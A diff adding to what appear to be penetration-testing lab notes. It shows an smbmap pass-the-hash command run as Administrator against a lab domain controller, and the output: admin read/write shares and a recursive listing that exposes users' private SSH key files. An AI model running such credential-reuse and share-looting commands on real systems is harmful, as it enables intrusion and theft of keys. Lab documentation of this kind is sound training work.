@@ -2740,3 +2740,76 @@ SMB again
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 -r "Department Shares" --depth 5
 ```
+
+```
+[+] IP: 172.16.8.3:445  Name: DC01.INLANEFREIGHT.LOCAL  Status: ADMIN!!!   
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  READ, WRITE     Remote Admin
+        C$                                                      READ, WRITE     Default share
+        Department Shares                                       READ ONLY       Share for department users
+        ./Department Shares
+        dr--r--r--                0 Wed Jun  1 14:34:56 2022    .
+        dr--r--r--                0 Wed Jun  1 14:34:56 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:36:07 2022    Accounting
+        dr--r--r--                0 Wed Jun  1 14:36:00 2022    Executives
+        dr--r--r--                0 Wed Jun  1 14:35:53 2022    Finance
+        dr--r--r--                0 Wed Jun  1 14:35:29 2022    HR
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    IT
+        dr--r--r--                0 Wed Jun  1 14:35:45 2022    Marketing
+        dr--r--r--                0 Wed Jun  1 14:35:37 2022    R&D
+        ./Department Shares//Accounting
+        dr--r--r--                0 Wed Jun  1 14:36:07 2022    .
+        dr--r--r--                0 Wed Jun  1 14:36:07 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:36:12 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:36:10 2022    Public
+        ./Department Shares//Executives
+        dr--r--r--                0 Wed Jun  1 14:36:00 2022    .
+        dr--r--r--                0 Wed Jun  1 14:36:00 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:36:05 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:36:02 2022    Public
+        ./Department Shares//Finance
+        dr--r--r--                0 Wed Jun  1 14:35:53 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:53 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:57 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:35:55 2022    Public
+        ./Department Shares//HR
+        dr--r--r--                0 Wed Jun  1 14:35:29 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:29 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:32 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:35:34 2022    Public
+        ./Department Shares//IT
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:16 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    Public
+        ./Department Shares//IT/Private
+        dr--r--r--                0 Wed Jun  1 14:35:16 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:16 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:16 2022    Development
+        dr--r--r--                0 Wed Jun  1 14:35:19 2022    Networking
+        ./Department Shares//IT/Private/Networking
+        dr--r--r--                0 Wed Jun  1 14:35:19 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:19 2022    ..
+        fr--r--r--             1706 Wed Jun  1 14:35:27 2022    harry-id_rsa
+        fr--r--r--             1702 Wed Jun  1 14:35:24 2022    james-id_rsa
+        fr--r--r--             1706 Wed Jun  1 14:35:22 2022    ssmallsadm-id_rsa
+        ./Department Shares//IT/Public
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:14 2022    web
+        ./Department Shares//Marketing
+        dr--r--r--                0 Wed Jun  1 14:35:45 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:45 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:50 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:35:48 2022    Public
+        ./Department Shares//R&D
+        dr--r--r--                0 Wed Jun  1 14:35:37 2022    .
+        dr--r--r--                0 Wed Jun  1 14:35:37 2022    ..
+        dr--r--r--                0 Wed Jun  1 14:35:43 2022    Private
+        dr--r--r--                0 Wed Jun  1 14:35:40 2022    Public
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ, WRITE     Logon server share 
+        SYSVOL                                                  READ, WRITE     Logon server share 
+[-] Closing connections..                                                                           
+```
